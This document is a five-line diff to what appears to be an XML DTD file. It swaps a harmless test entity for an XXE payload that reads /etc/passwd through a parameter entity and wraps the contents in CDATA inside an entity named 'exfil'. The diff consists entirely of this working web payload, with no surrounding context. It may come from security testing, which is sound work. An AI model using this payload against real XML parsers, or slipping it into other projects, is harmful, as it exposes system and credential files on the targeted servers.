@@ -1,1 +1,5 @@
-<!ENTITY test "HELLO">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY exfil '%start;%file;%end;'>">
+%all;
